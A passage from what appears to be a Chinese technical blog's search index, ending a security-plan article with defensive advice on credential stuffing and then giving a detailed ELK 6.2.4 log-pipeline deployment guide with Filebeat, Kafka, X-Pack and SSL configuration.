建议：用户信息以加密后的密文形式保存。 g.撞库 由于大多数用户都使用同一套账号密码，当一个网站的用户信息泄露后，攻击者能利用这些数据对其他网站进行登陆，从而获得一份真实有效的用户凭证。 建议：限制ip的登陆频率；新ip登陆时需要验证身份； 三、方案简述1.安全评估a.系统上线前安全评估b.服务器安全基线检查2.安全审计a.Web应用代码审计b.移动应用代码审计3.安全运营a.日志审计b.警告处置c.安全培训4.应急响应a.突发事件处置b.复盘溯源5.监控扫描a.漏洞扫描b.文件监控6.边界防御a.网络管控b.抗D]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全文档</tag>
        <tag>安全方案</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源产品自建企业安全-脑图]]></title>
    <url>%2FSecurity%2F%E5%BC%80%E6%BA%90%E4%BA%A7%E5%93%81%E8%87%AA%E5%BB%BA%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8-%E8%84%91%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>企业安全</tag>
        <tag>脑图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELK6.2.4部署]]></title>
    <url>%2Fdeployment%2FELK6-2-4%E9%83%A8%E7%BD%B2%2F</url>
    <content type="text"><![CDATA[一、ELK介绍1.什么是ELKELK是指elastic公司三款开源产品的简称（此外，还可能经常用到Filebeat和X-Pack），他们分别是： 简称 全称 描述 E: Elasticsearch 开源全文搜索和分析引擎 L: Logstash 开源数据收集引擎 K: Kibana 开源数据分析和可视化平台 Filebeat 轻量级数据转发引擎 X-Pack Elastic Stack扩展包 2.为什么需要ELK随着公司业务的不断扩展，各个系统日志产生量越来越大，这时候就需要日志统一管理的解决方案，便于之后的日志审计等工作。而ELK具有强大的日志收集、查询和分析等功能，同时还提供了友好的展示界面，便于用户操作，这贴合日志统一管理的需求。 3.ELK工作原理12345678graph LR;服务器1--&gt;|Filebeat|Logstash1;服务器2--&gt;|Filebeat|Logstash1;服务器3--&gt;|Filebeat|Logstash1;Logstash1--&gt;Kafka集群;Kafka集群--&gt;Logstash2;Logstash2--&gt;Elasticsearch集群;Elasticsearch集群--&gt;Kibana; 二、环境配置1.服务器清单 ip 描述 安装软件 192.168.1.11 web服务器 Filebeat 192.168.1.12 web服务器 Filebeat 192.168.1.13 数据库服务器 Filebeat 192.168.1.21 Kafka集群 Kafka + logstash 192.168.1.22 Kafka集群 Kafka + logstash 192.168.1.23 Kafka集群 Kafka + logstash 192.168.1.31 logstash X-Pack + logstash 192.168.1.41 Elasticsearch集群 Elasticsearch + X-Pack + Kibana 192.168.1.42 Elasticsearch集群 Elasticsearch + X-Pack + Kibana 192.168.1.43 Elasticsearch集群 Elasticsearch + X-Pack + Kibana 2.安装JDKELK6.X.X要求JDK版本大于1.8 ，官网下载后上传至服务器安装yum localinstall -y jdk-XXX安装完成后测试安装是否成功java -version 3.关闭防火墙systemctl stop firewalld.service #停止firewall systemctl disable firewalld.service #禁止firewall开机启动 生产环境中请根据实际需求配置防火墙。 4.安装screenyum install -y screen 5.下载Elasticserch、Logstash、Kibana、Kafka官网下载后上传至服务器 三、Filebeat配置1.安装Filebeatcurl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-6.3.0-x86_64.rpmrpm -ivh filebeat-6.3.0-x86_64.rpm 2.监控nginx日志将nginx日志格式修改为json1234567891011121314log_format access_json '&#123;"@timestamp":"$time_iso8601",' '"host":"$server_addr",' '"clientip":"$remote_addr",' '"size":$body_bytes_sent,' '"responsetime":$request_time,' '"upstreamtime":"$upstream_response_time",' '"upstreamhost":"$upstream_addr",' '"http_host":"$host",' '"url":"$uri",' '"domain":"$host",' '"xff":"$http_x_forwarded_for",' '"referer":"$http_referer",' '"status":"$status"&#125;'; access_log /var/log/nginx/access.log access_json; 修改Filebeat配置文件vi /etc/filebeat/filebeat.yml12345678910filebeat.prospectors:- input_type: log paths: - /home/wwwlogs/access.log document_type: &quot;nginx_access&quot; fields: logsource: nginx logtype: nginx_accessoutput.logstash: hosts: [&quot;192.168.1.21:5044&quot;] #不同日志根据实际情况传送至不同Kafka服务器 3.监控mysql慢查询日志修改filebeat日志vi /etc/filebeat/filebeat.yml1234567891011121314151617181920212223242526272829303132333435363738- input_type: log paths: - /usr/local/mysql/var/mysql/slow_log.CSV document_type: &quot;mysql_slow&quot; fields: logsource: mysql logtype: mysql_slowif [fields][logtype] == &quot;mysql_slow&quot; &#123; csv &#123; columns =&gt; [ &quot;timestamp&quot;, &quot;user_host&quot;, &quot;query_time&quot;, &quot;lock_time&quot;, &quot;rows_sent&quot;, &quot;rows_examined&quot;, &quot;db&quot;, &quot;last_insert_id&quot;, &quot;insert_id&quot;, &quot;server_id&quot;, &quot;sql_text&quot;, &quot;thread_id&quot;, &quot;rows_affected&quot; ] &#125; mutate &#123; convert =&gt; &#123; &quot;rows_sent&quot; =&gt; &quot;integer&quot; &#125; convert =&gt; &#123; &quot;rows_examined&quot; =&gt; &quot;integer&quot; &#125; convert =&gt; &#123; &quot;last_insert_id&quot; =&gt; &quot;integer&quot; &#125; convert =&gt; &#123; &quot;insert_id&quot; =&gt; &quot;integer&quot; &#125; convert =&gt; &#123; &quot;server_id&quot; =&gt; &quot;integer&quot; &#125; convert =&gt; &#123; &quot;thread_id&quot; =&gt; &quot;integer&quot; &#125; convert =&gt; &#123; &quot;rows_affected&quot; =&gt; &quot;integer&quot; &#125; &#125; date &#123; match =&gt; [ &quot;timestamp&quot;, &quot;yyyy-MM-dd HH:mm:ss.SSSSSS&quot; ] remove_field =&gt; [ &quot;timestamp&quot; ] &#125; mutate &#123; gsub =&gt; [ &quot;query_time&quot;, &quot;(.*\.)(\d)(\d)\d+&quot;, &quot;\1\2\3&quot;, &quot;lock_time&quot;, &quot;(.*\.)(\d)(\d)\d+&quot;, &quot;\1\2\3&quot; ] &#125; ruby &#123; code =&gt; &quot;event.set(&apos;query_time&apos; , event.get(&apos;query_time&apos;) ? event.get(&apos;query_time&apos;).split(&apos;:&apos;).inject(0)&#123;|a, m| a = a * 60 + m.to_f&#125; : 0)&quot;&#125; ruby &#123; code =&gt; &quot;event.set(&apos;lock_time&apos; , event.get(&apos;lock_time&apos;) ? event.get(&apos;lock_time&apos;).split(&apos;:&apos;).inject(0)&#123;|a, m| a = a * 60 + m.to_f&#125; : 0)&quot; &#125; &#125; output.logstash: hosts: [&quot;192.168.1.23:5044&quot;] #不同日志根据实际情况传送至不同Kafka服务器 二、Kafka集群上的Logstash配置1.接收nginx日志1234567891011121314151617181920212223242526272829input &#123; beats &#123; port =&gt; 5044 codec =&gt; plain&#123; charset =&gt; &quot;GBK&quot; &#125; #设置编码 &#125;&#125;filter &#123; if [fields][logtype] == &quot;nginx_access&quot;&#123; mutate &#123; gsub =&gt; [&quot;message&quot;, &quot;\\x0D&quot;, &quot;&quot;] #替换字符 gsub =&gt; [&quot;message&quot;, &quot;\\x0A&quot;, &quot;&quot;] gsub =&gt; [&quot;message&quot;, &quot;\\x22&quot;, &quot;&quot;] &#125; json &#123; source =&gt; &quot;message&quot; &#125; &#125;&#125;output &#123; if [fields][dep] == &quot;nginx_access&quot;&#123; kafka &#123; id =&gt;&quot;my_kafka_id&quot; codec =&gt; json topic_id =&gt;&quot;test&quot; bootstrap_servers =&gt; &quot;192.168.1.21:9092&quot; batch_size =&gt; 5 &#125; &#125;&#125; 2.接收mysql慢查询日志12345678910111213141516input &#123; beats &#123; port =&gt; 5044 &#125;&#125;output &#123;if [fields][logtype] == &quot;mysql_slow&quot;&#123; kafka &#123; id =&gt;&quot;my_kafka_id&quot; codec =&gt; json topic_id =&gt;&quot;test&quot; bootstrap_servers =&gt; &quot;192.168.1.23:9092&quot; batch_size =&gt; 5 &#125; &#125;&#125; 四.Kafka配置创建数据和日志目录mkdir /kafka/zookeeper/datamkdir /kafka/zookeeper/logs创建myid 文件(每台服务器写入不同值)echo 1 &gt; /kafka/zookeeper/data/myid配置zookeeper12345678910111213141516maxClientCnxns=0dataDir=/kafka/zookeeper/datadataLogDir=/kafka/zookeeper/logsclientPort=2181#最大客户端连接数maxClientCnxns=20#心跳间隔tickTime=2000当初始化连接时间超过该值，则表示连接失败。initLimit=10#此配置项表示Leader与Follower之间发送消息时，请求和应答时间长度。syncLimit=5#第一个端口是连接到leader的端口，第二个是用来选举leader 用的端口server.1=192.168.1.21:2888:3888server.2=192.168.1.22:2888:3888server.3=192.168.1.23:2888:3888 配置kafka1234567891011121314151617181920212223broker.id=0 ##集群每个服务器不同#消费者的访问端口，logstash或者elasticsearchlisteners=PLAINTEXT://192.168.1.21:9092#接收和发送线程数num.network.threads=3#处理请求线程数num.io.threads=8#发送缓冲区socket.send.buffer.bytes=102400#接收缓冲区socket.receive.buffer.bytes=102400#套接字服务器接受请求上限(防止OOM)。socket.request.max.bytes=104857600#以逗号分隔的目录列表，其中存储日志文件。log.dirs=/home/kafka/logsnum.partitions=1num.recovery.threads.per.data.dir=1offsets.topic.replication.factor=1transaction.state.log.replication.factor=1transaction.state.log.min.isr=1zookeeper.connect=192.168.1.21:2181,192.168.1.22:2181,192.168.1.23:2181zookeeper.connection.timeout.ms=6000group.initial.rebalance.delay.ms=0 启动集群nohup /kafka/bin/zookeeper-server-start.sh zookeeper.properties &gt;&gt;/dev/null 2&gt;&amp;1 &amp;nohup /kafka/bin/kafka-server-start.sh /kafka/config/server.properties &gt;&gt;/dev/null 2&gt;&amp;1 &amp;测试集群/kafka/bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test/kafka/bin/kafka-topics.sh --zookeeper 192.168.1.21:2181 --list 五、Elasticsearch配置由于elasticsearch无法在root权限下运行，在此创建账号elkuseradd eeelk解压elasticsearch文件tar -zxvf elasticserch-6.2.4.tar.gz修改配置文件（三台服务器均需修改，node.name不同即可）vi elasticsearch-6.2.4/config/elasticsearch.yml12345678910cluster.name: myescluster #自定义修改一个集群名称node.name: node1 #节点名称network.host: 192.168.1.41 #节点IP（或者解析的主机名）http.port: 9200http.cors.enabled: truehttp.cors.allow-origin: &quot;*&quot;http.cors.allow-headers: Authorization,X-Requested-With,Content-Length,Content-Typebootstrap.memory_lock: false #设置elasticsearch的进程锁住内存discovery.zen.ping.unicast.hosts: [&quot;192.168.1.41&quot;, &quot;192.168.1.42&quot;,&quot;192.168.1.43&quot;] #集群个节点IP地址discovery.zen.minimum_master_nodes: 2 #为了避免脑裂，集群节点数最少为 半数+1 向limits.conf添加以下内容（设置允许打开文件最大值）vi /etc/security/limits.conf1234* soft nofile 655360* hard nofile 655360root soft nofile 100001root hard nofile 100002 向sysctl.conf中添加以下内容（设置最大线程数）vi /etc/sysctl.conf1vm.max_map_count=655360 使配置生效sysctl -p赋予elk用户文件夹权限chown -R elk.elk /home/elk/elasticsearch-6.2.4/运行elksu eeelk ./elasticsearch-6.2.4/bin/elasticsearch -d打开浏览器访问http://ip:9200 六、elasticsearch-head安装官网查询对应版本下载连接安装nodejswget https://nodejs.org/dist/v8.11.3/node-v8.11.3-linux-x64.tar.xz xz -d node-v8.11.2-linux-x64.tar.xz tar xvf node-v8.11.2-linux-x64.tar 将nodejs加入环境变量vi /etc/profile12export NODE_HOME=/home/eeelk/node-v8.11.3-linux-x64export PATH=$NODE_HOME/bin:$PATH 使环境变量生效source /etc/profile安装elasticsearch-headwget https://github.com/mobz/elasticsearch-head/archive/master.zipunzip master.zipcd elasticsearch-head-masternpm install如果安装时报错提示phantomjs-prebuilt安装失败则执行npm install phantomjs-prebuilt@2.1.16 --ignore-scripts修改elasticsearch-head配置vi Gruntfile.js启动elasticsearch-headnpm run start打开浏览器访问http://ip:9100 七、kibana配置修改配置文件vi kibana-6.2.4/config/kibana.yml启动kibana./kibana-6.2.4/bin/kibana访问http://ip:5601 八、X-Pack安装1.在elasticsearh上安装x-pack/elasticsearch-6.2.4/bin/elasticsearch-plugin install x-pack安装完成后重启elasticsearch服务后，初始化密码./elasticsearch-6.2.4/bin/x-pack/setup-passwords interactive 2.在logstash上安装x-Pack.logstash-6.2.4/bin/logstash-plugin install x-pack在logstash.yml中设置账号密码12xpack.monitoring.elasticsearch.username: logstash_systemxpack.monitoring.elasticsearch.password: 初始化elk中x-pack生成的密码 在logstash的config文件中添加elasticsearh账号密码123456output &#123; elasticsearch &#123; hosts =&gt; [&quot;192.168.1.41:9200&quot;,&quot;192.168.1.42:9200&quot;,&quot;192.168.1.43:9200&quot;] user =&gt; &quot;elastic&quot; password =&gt; &quot;123456&quot;&#125; 3.在kibana上安装x-pack/kibana-6.2.4/bin/kibana-plugin install x-pack在kibana配置中设置账号密码vi kibana-6.2.4/config/kibana.yml12elasticsearch.username: &quot;elasti&quot;elasticsearch.password: &quot;123456&quot; 在elasticsearch配置中启用x-pack验证vi elasticsearch-6.2.4/config/kibana.yml1xpack.security.enabled: true 重启elasticsearch、kibana、logstash服务 九、Logstash配置123456789101112131415161718192021222324252627282930input&#123; kafka&#123; codec =&gt; json bootstrap_servers =&gt; &quot;192.168.1.21:9092,192.168.1.22:9092,192.168.1.23:9092&quot; auto_offset_reset =&gt; &quot;latest&quot; #从最新的偏移量开始消费 consumer_threads =&gt; 5 decorate_events =&gt; true #此属性会将当前topic、offset、group、partition等信息也带到message中 topics =&gt; &quot;test&quot; #数组类型，可配置多个topic &#125;&#125;filter &#123; geoip &#123; source =&gt; &quot;slbip&quot; # 与日志中访问地址的key要对应 target =&gt; &quot;geoip&quot; database =&gt; &quot;GeoLite2-City_20180605/GeoLite2-City.mmdb&quot; add_field =&gt; [ &quot;[geoip][coordinates]&quot;,&quot;%&#123;[geoip][longitude]&#125;&quot; ] add_field =&gt; [ &quot;[geoip][coordinates]&quot;,&quot;%&#123;[geoip][latitude]&#125;&quot; ] &#125; mutate &#123; convert =&gt; [ &quot;[geoip][coordinates]&quot;,&quot;float&quot; ] &#125;&#125;output&#123; elasticsearch &#123; hosts =&gt; [&quot;192.168.1.41:9200&quot;,&quot;192.168.1.42:9200&quot;,&quot;192.168.1.43:9200&quot;] index =&gt; &quot;logstash-%&#123;[fields][dep]&#125;-%&#123;[fields][project]&#125;-%&#123;[fields][logsource]&#125;-%&#123;+YYYY.MM.dd&#125;&quot; user =&gt; &quot;elastic&quot; password =&gt; &quot;123456&quot; &#125;&#125; 十、filebeat&amp;logstash通过ssl交互安装opensslwget https://www.openssl.org/source/openssl-1.1.1-pre8.tar.gztar -zxvf openssl-1.1.1-pre8.tar.gzcd openssl-1.1.1-pre8./config --prefix=/usr/local/openssl./config -tmakemake install 创建证书创建证书目录mkdir -p /etc/pki/tls/certsmkdir -p /etc/pki/tls/private生成证书vi /etc/ssl/openssl.cnf12#在[ v3_ca ]下面填写subjectAltName = IP:192.168.1.21 cd /etc/pki/tls/openssl req -config /usr/local/openssl/ssl/openssl.cnf -x509 -days 3650 -batch -nodeopenssl req -subj &#39;/CN=192.168.1.21/&#39; -x509 -days $((100 * 365)) -batch -nodes -newkey rsa:2048 -keyout pki/tls/private/logstash.key -out pki/tls/certs/logstash.crt在filebeat机器上生成证书文件 配置证书将filebeat.crt logstash.crt 传到对方服务器修改logstash配置vi /home/elk/logstash-6.2.4/config/logs.conf1234567891011input &#123; beats &#123; host =&gt; &quot;192.168.1.21&quot; port =&gt; 5044 ssl =&gt; true ssl_certificate_authorities =&gt; [&quot;/etc/pki/tls/certs/filebeat.crt&quot;] ssl_certificate =&gt; &quot;/etc/pki/tls/certs/logstash.crt&quot; ssl_key =&gt; &quot;/etc/pki/tls/private/logstash.key&quot; ssl_verify_mode =&gt; &quot;force_peer&quot; &#125;&#125; 修改filebeat配置vi /etc/filebeat/filebeat.yml12345output.logstash: hosts: [&quot;192.168.1.21:5044&quot;] ssl.certificate_authorities: [&quot;/etc/pki/tls/certs/logstash.crt&quot;] ssl.certificate: &quot;/etc/pki/tls/certs/filebeat.crt&quot; ssl.key: &quot;/etc/pki/tls/private/filebeat.key&quot; 重启logstash和filebeat服务]]></content>
      <categories>
        <category>deployment</category>
      </categories>
      <tags>
        <tag>企业安全</tag>
        <tag>ELK</tag>
      </tags>
  </entry>
</search>
